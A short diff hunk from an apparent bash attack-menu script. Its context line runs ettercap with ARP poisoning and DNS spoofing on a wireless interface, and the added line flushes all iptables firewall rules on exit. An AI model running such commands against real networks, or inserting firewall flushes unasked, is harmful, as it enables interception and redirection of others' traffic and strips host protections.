@@ -132,6 +132,7 @@ echo -e  "$red[$green*$red]$green Starting ettercap $nc"
 ettercap -Tqi wlan0 -M arp:remote -P dns_spoof /// ;;
 
 		6)  echo -e $yellow " Exiting Script. Good Bye !!"
+iptables -F;
 sleep 3;
 exit 
 ;;
